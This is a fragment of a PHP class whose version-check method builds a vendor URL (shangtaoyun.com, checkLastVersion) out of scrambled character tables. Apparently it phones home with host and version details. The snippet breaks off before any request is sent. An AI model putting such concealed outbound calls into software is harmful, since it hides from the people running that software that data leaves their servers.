...
class Query
{
    ...
    public function findWVersion(){
         try{
             ...
             if(!$cl){
                 $encrypt = 't/ang?owyuscmidl:cphekLVr&.=';
                 $encrypt2 = '_WsLcCOdmFSeM.wtToVrNina5l';
                 $encrypt3 = ['snriove=','_&enrv5dmsio=','cl&snie=','oh&ts='];
                 $datas = [19,0,0,18,10,16,1,1,7,7,7,26,10,19,2,3,4,0,2,6,8,9,3,26,11,6,12,1,2,18,13,1,14,6,7,3,15,6,2,14,10,1,11,19,20,11,21,22,2,10,0,23,20,24,13,6,3,26,19,0,12,15,5,25,21,20,8,27];
